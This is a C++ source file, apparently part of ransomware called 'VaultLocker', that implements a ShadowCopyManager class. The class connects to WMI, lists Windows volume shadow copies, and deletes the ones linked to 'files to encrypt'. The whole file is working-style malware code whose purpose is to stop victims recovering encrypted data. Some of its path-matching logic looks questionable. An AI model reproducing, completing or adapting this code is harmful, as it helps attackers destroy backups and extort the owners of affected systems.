// VAULTLOCKER. 2024
// ShadowCopyManager.CPP
// FUNCTION TO DELETE SHADOW COPIES

#include "ShadowCopyManager.h"

ShadowCopyManager::ShadowCopyManager() : initialized(false) {
    // CONSTRUCTOR
}

ShadowCopyManager::~ShadowCopyManager() {
    Cleanup();
}

bool ShadowCopyManager::Initialize() {
    if (initialized) {
        return true;
    }

    HRESULT hres;

    // INITILIZE COM
    hres = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hres)) {
        return false;
    }

    // INITILIZE COM SECURITY
    hres = CoInitializeSecurity(
        nullptr,
        -1,
        nullptr,
        nullptr,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_NONE,
        nullptr
    );

    if (FAILED(hres)) {
        CoUninitialize();
        return false;
    }

    initialized = true;
    return true;
}

void ShadowCopyManager::Cleanup() {
    if (initialized) {
        CoUninitialize();
        initialized = false;
    }
}

bool ShadowCopyManager::DeleteShadowCopiesOfFilesToEncrypt(const std::vector<std::wstring>& filePaths) {
    if (!initialized) {
        return false;
    }

    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;
    IEnumWbemClassObject* pEnumerator = nullptr;

    HRESULT hres;

    // INITILIZE LOCATOR
    hres = CoCreateInstance(
        CLSID_WbemLocator,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        reinterpret_cast<void**>(&pLoc)
    );

    if (FAILED(hres)) {
        return false;
    }

    // CONNECT TO WMI
    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),
        nullptr,
        nullptr,
        nullptr,
        0,
        nullptr,
        nullptr,
        &pSvc
    );

    if (FAILED(hres)) {
        pLoc->Release();
        return false;
    }

    // SET SECURITY LEVELS ON PROXY
    hres = CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        nullptr,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_NONE
    );

    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    // QUERY FOR ALL SHADOW COPIES
    hres = pSvc->ExecQuery(
        _bstr_t(L"WQL"),
        _bstr_t(L"SELECT * FROM Win32_ShadowCopy"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        nullptr,
        &pEnumerator
    );

    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    // ENUMERATE THROUGH RESULTS OF QUERY
    IWbemClassObject* pShadowCopy = nullptr;
    ULONG uReturn = 0;

    while (pEnumerator) {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pShadowCopy, &uReturn);

        if (uReturn == 0) {
            break;
        }

        VARIANT vtPath;
        VariantInit(&vtPath);

        // GET THE DEVICE OBJECT PROPERTY OF THE SHADOW COPY
        hr = pShadowCopy->Get(L"DeviceObject", 0, &vtPath, nullptr, nullptr);
        if (SUCCEEDED(hr)) {
            if (vtPath.vt == VT_BSTR) {
                std::wstring shadowCopyPath(vtPath.bstrVal);

                // CHECK IF THE SHADOW COPY IS RELATED TO FILES ABOUT TO BE ENCRYPTED
                if (IsShadowCopyRelatedToFilesToEncrypt(shadowCopyPath, filePaths)) {
                    // DELETE THE SHADWO COPY
                    DeleteShadowCopy(shadowCopyPath);
                }
            }
        }

        VariantClear(&vtPath);
        pShadowCopy->Release();
    }

    pSvc->Release();
    pLoc->Release();
    pEnumerator->Release();

    return true;
}

bool ShadowCopyManager::DeleteShadowCopy(const std::wstring& shadowCopyPath) {
    if (!initialized) {
        return false;
    }

    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;
    IWbemClassObject* pShadowCopy = nullptr;
    IWbemClassObject* pOutParams = nullptr;

    HRESULT hres;

    // INITILIZE THE LOCATOR
    hres = CoCreateInstance(
        CLSID_WbemLocator,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        reinterpret_cast<void**>(&pLoc)
    );

    if (FAILED(hres)) {
        return false;
    }

    // CONNECT TO WMI
    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),
        nullptr,
        nullptr,
        nullptr,
        0,
        nullptr,
        nullptr,
        &pSvc
    );

    if (FAILED(hres)) {
        pLoc->Release();
        return false;
    }

    // SET SECURITY LEVELS ON THE PROXY
    hres = CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        nullptr,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_NONE
    );

    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    // GET THE SPECIFIC SHADOW COPY OBJECT
    hres = pSvc->GetObject(
        _bstr_t(shadowCopyPath.c_str()),
        0,
        nullptr,
        &pShadowCopy,
        nullptr
    );

    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    // CALL THE DELETE METHOD ON THE SHADOW COPY OBJECT
    hres = pSvc->ExecMethod(
        _bstr_t(shadowCopyPath.c_str()),
        _bstr_t(L"Delete"),
        0,
        nullptr,
        nullptr,
        &pOutParams,
        nullptr
    );

    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    pSvc->Release();
    pLoc->Release();
    return true;
}

bool ShadowCopyManager::IsShadowCopyRelatedToFilesToEncrypt(const std::wstring& shadowCopyPath, const std::vector<std::wstring>& filePaths) {

    for (const auto& filePath : filePaths) {
        if (shadowCopyPath.find(filePath) == 0) {
            return true;
        }
    }

    return false;
}
